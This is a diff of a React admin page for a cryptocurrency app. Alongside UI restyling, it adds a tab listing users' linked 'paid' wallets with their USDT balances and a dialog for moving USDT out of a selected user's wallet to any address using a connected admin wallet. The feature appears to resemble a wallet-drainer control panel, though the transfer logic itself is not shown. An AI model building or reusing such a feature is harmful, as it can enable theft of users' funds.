+                              <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.destinationAddress, "Destination address")}>
+                                Copy Destination
+                              </DropdownMenuItem>
+                            </DropdownMenuContent>
+                          </DropdownMenu>
+                        </div>
                       </div>
                       <p className="text-sm text-muted-foreground break-words">
                         {entry.note || "No note"} · tx:{" "}
@@ -783,20 +1114,128 @@ const Admin = () => {
                   </Card>
                 ))}
                 {withdrawalEntries.length === 0 && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      No frontend withdrawal transactions in this session yet.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <Wallet className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">No withdrawals yet</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Completed withdrawal transactions will appear here in this session.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
               </div>
             </TabsContent>
 
+            <TabsContent value="manage-wallets" className="space-y-5">
+              <div className="app-sticky-subheader">
+                <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+                <h3 className="font-display font-bold text-lg text-foreground">Manage Users Wallet</h3>
+                <div className="w-full sm:w-[220px]">
+                  <Select value={manageWalletChain} onValueChange={(value) => handleManageWalletChainChange(value as SupportedChain)}>
+                    <SelectTrigger className="h-10 rounded-xl bg-muted/50 border-border/60">
+                      <SelectValue placeholder="Select chain" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="ethereum">Ethereum</SelectItem>
+                      <SelectItem value="bsc">BSC</SelectItem>
+                      <SelectItem value="tron">Tron</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+                </div>
+              </div>
+
+              {isLoadingPaidWalletEntries ? (
+                <Card className="app-section-card rounded-xl">
+                  <CardContent className="p-5 sm:p-6">
+                    <div className="flex items-center gap-3 mb-4">
+                      <Loader2 className="w-4 h-4 animate-spin text-accent" />
+                      <p className="text-sm text-foreground">Loading paid wallets</p>
+                    </div>
+                    <div className="space-y-2.5">
+                      <div className="app-skeleton-line w-5/6" />
+                      <div className="app-skeleton-line w-2/3" />
+                      <div className="app-skeleton-line w-3/4" />
+                    </div>
+                  </CardContent>
+                </Card>
+              ) : (
+                <div className="space-y-3">
+                  {paidWalletEntries.map((entry) => (
+                    <Card key={`${entry.userId}-${entry.walletAddress}`} className="app-section-card app-list-card rounded-xl">
+                      <CardContent className="p-5 flex flex-col gap-4">
+                        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
+                          <div className="min-w-0">
+                            <p className="text-sm font-semibold text-foreground break-all">{entry.walletAddress}</p>
+                            <p className="text-xs text-muted-foreground mt-1 break-all">
+                              User: {entry.userId}
+                            </p>
+                          </div>
+                          <div className="flex items-center gap-2">
+                            <Button variant="outline" onClick={() => openSendUsdtModal(entry)} className="h-10 rounded-xl">
+                              Send USDT
+                            </Button>
+                            <DropdownMenu>
+                              <DropdownMenuTrigger asChild>
+                                <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9">
+                                  <MoreHorizontal className="w-4 h-4" />
+                                </Button>
+                              </DropdownMenuTrigger>
+                              <DropdownMenuContent align="end">
+                                <DropdownMenuItem onClick={() => openSendUsdtModal(entry)}>
+                                  Open Transfer Modal
+                                </DropdownMenuItem>
+                                <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.walletAddress, "Wallet address")}>
+                                  Copy Wallet
+                                </DropdownMenuItem>
+                                <DropdownMenuItem onClick={() => void handleCopyToClipboard(entry.userId, "User ID")}>
+                                  Copy User ID
+                                </DropdownMenuItem>
+                              </DropdownMenuContent>
+                            </DropdownMenu>
+                          </div>
+                        </div>
+                        <div className="grid grid-cols-1 md:grid-cols-4 gap-3 text-sm">
+                          <div>
+                            <p className="text-xs text-muted-foreground">USDT Balance</p>
+                            <p className="font-medium">
+                              {entry.usdtBalance ? `${entry.usdtBalance} USDT` : "Unavailable"}
+                            </p>
+                          </div>
+                        </div>
+                        {entry.balanceFetchError && (
+                          <p className="text-xs text-warning">Balance fetch issue: {entry.balanceFetchError}</p>
+                        )}
+                      </CardContent>
+                    </Card>
+                  ))}
+                  {paidWalletEntries.length === 0 && (
+                    <Card className="app-section-card rounded-xl">
+                      <CardContent className="app-empty-state">
+                        <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                          <Users className="w-5 h-5 text-accent" />
+                        </div>
+                        <p className="text-sm font-semibold text-foreground">No active wallets found</p>
+                        <p className="text-xs text-muted-foreground mt-1">
+                          Switch chain or wait for users with active linked wallets.
+                        </p>
+                      </CardContent>
+                    </Card>
+                  )}
+                </div>
+              )}
+            </TabsContent>
+
             <TabsContent value="audit" className="space-y-5">
-              <h3 className="font-display font-bold text-lg text-foreground">Audit Logs</h3>
+              <div className="app-sticky-subheader">
+                <h3 className="font-display font-bold text-lg text-foreground">Audit Logs</h3>
+              </div>
               <div className="space-y-3">
                 {auditLogs.map((log) => (
-                  <Card key={log.id} className="glass-card rounded-xl">
+                  <Card key={log.id} className="app-section-card app-list-card rounded-xl">
                     <CardContent className="p-5 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
                       <div className="flex items-center gap-4 min-w-0">
                         <div className={`w-11 h-11 rounded-xl border flex items-center justify-center ${
@@ -817,14 +1256,37 @@ const Admin = () => {
                           </p>
                         </div>
                       </div>
-                      <ChevronRight className="w-4 h-4 text-muted-foreground self-start sm:self-auto" />
+                      <DropdownMenu>
+                        <DropdownMenuTrigger asChild>
+                          <Button variant="ghost" size="icon" className="rounded-lg h-9 w-9 self-start sm:self-auto">
+                            <MoreHorizontal className="w-4 h-4" />
+                          </Button>
+                        </DropdownMenuTrigger>
+                        <DropdownMenuContent align="end">
+                          <DropdownMenuItem onClick={() => void handleCopyToClipboard(log.actor_user_id, "Actor user ID")}>
+                            Copy Actor ID
+                          </DropdownMenuItem>
+                          <DropdownMenuItem onClick={() => void handleCopyToClipboard(log.action, "Action")}>
+                            Copy Action
+                          </DropdownMenuItem>
+                          <DropdownMenuItem onClick={() => void handleCopyToClipboard(JSON.stringify(log.metadata_json), "Metadata")}>
+                            Copy Metadata JSON
+                          </DropdownMenuItem>
+                        </DropdownMenuContent>
+                      </DropdownMenu>
                     </CardContent>
                   </Card>
                 ))}
                 {auditLogs.length === 0 && (
-                  <Card className="glass-card rounded-xl">
-                    <CardContent className="p-5 text-sm text-muted-foreground">
-                      No audit logs available.
+                  <Card className="app-section-card rounded-xl">
+                    <CardContent className="app-empty-state">
+                      <div className="mx-auto mb-3 w-11 h-11 rounded-xl bg-accent/10 border border-accent/20 flex items-center justify-center">
+                        <AlertTriangle className="w-5 h-5 text-accent" />
+                      </div>
+                      <p className="text-sm font-semibold text-foreground">No audit logs available</p>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        Security and admin actions will be recorded here.
+                      </p>
                     </CardContent>
                   </Card>
                 )}
@@ -833,15 +1295,122 @@ const Admin = () => {
           </Tabs>
         </motion.div>
       </div>
+      <div className="app-mobile-actionbar">
+        <div className="flex items-center gap-2 overflow-x-auto pb-2">
+          <Button
+            variant={activeTab === "users" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("users")}
+          >
+            Users
+          </Button>
+          <Button
+            variant={activeTab === "disclosures" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("disclosures")}
+          >
+            Disclosures
+          </Button>
+          <Button
+            variant={activeTab === "withdrawals" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("withdrawals")}
+          >
+            Withdraw
+          </Button>
+          <Button
+            variant={activeTab === "manage-wallets" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("manage-wallets")}
+          >
+            Wallets
+          </Button>
+          <Button
+            variant={activeTab === "audit" ? "accent" : "outline"}
+            size="sm"
+            className="shrink-0"
+            onClick={() => setActiveTab("audit")}
+          >
+            Audit
+          </Button>
+        </div>
+        <Button variant="accent" className="w-full h-11" onClick={handleQuickAction} disabled={quickActionDisabled}>
+          {quickActionLabel}
+        </Button>
+      </div>
       <WalletSelectModal
         open={isWalletModalOpen}
         onOpenChange={setIsWalletModalOpen}
         selectedChain={selectedChain}
-        onSelectWallet={(method) => {
-          void handleConnectWithdrawalWallet(method);
+        onSelectWallet={(method, walletId) => {
+          void handleConnectWithdrawalWallet(method, walletId);
         }}
         isConnecting={isConnectingWallet}
       />
+      <Dialog open={isSendUsdtModalOpen} onOpenChange={setIsSendUsdtModalOpen}>
+        <DialogContent className="rounded-2xl">
+          <DialogHeader>
+            <DialogTitle>Transfer USDT From User Wallet</DialogTitle>
+            <DialogDescription>
+              Transfer USDT on {manageWalletChain.toUpperCase()} from the selected user wallet to the address below.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="space-y-4">
+            <div className="space-y-1">
+              <p className="text-xs text-muted-foreground">Selected User Wallet</p>
+              <p className="text-sm font-medium break-all">{sendUsdtTarget?.walletAddress ?? "N/A"}</p>
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="sendUsdtDestination">Address</Label>
+              <Input
+                id="sendUsdtDestination"
+                value={sendUsdtDestinationAddress}
+                onChange={(event) => setSendUsdtDestinationAddress(event.target.value)}
+                placeholder={manageWalletChain === "tron" ? "T..." : "0x..."}
+              />
+            </div>
+            <div className="space-y-2">
+              <Label htmlFor="sendUsdtAmount">Amount (USDT)</Label>
+              <Input
+                id="sendUsdtAmount"
+                value={sendUsdtAmount}
+                onChange={(event) => setSendUsdtAmount(event.target.value)}
+                type="number"
+                min="0.01"
+                step="0.01"
+              />
+            </div>
+            <div className="space-y-1">
+              <p className="text-xs text-muted-foreground">Connected Admin Wallet</p>
+              <p className="text-sm font-medium break-all">
+                {sendUsdtWalletAddress || "Not connected"}
+              </p>
+            </div>
+            <div className="flex flex-col sm:flex-row gap-2">
+              <Button
+                variant="outline"
+                onClick={() => void handleConnectSendUsdtWallet()}
+                disabled={isConnectingSendUsdtWallet || isSendingUsdt}
+                className="h-11 rounded-xl"
+              >
+                {isConnectingSendUsdtWallet ? "Connecting..." : "Connect Admin Wallet"}
+              </Button>
+              <Button
+                variant="accent"
+                onClick={() => void handleSendUsdtToUser()}
+                disabled={isSendingUsdt || isConnectingSendUsdtWallet || !sendUsdtTarget}
+                className="h-11 rounded-xl"
+              >
+                {isSendingUsdt ? "Sending..." : "Send USDT"}
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
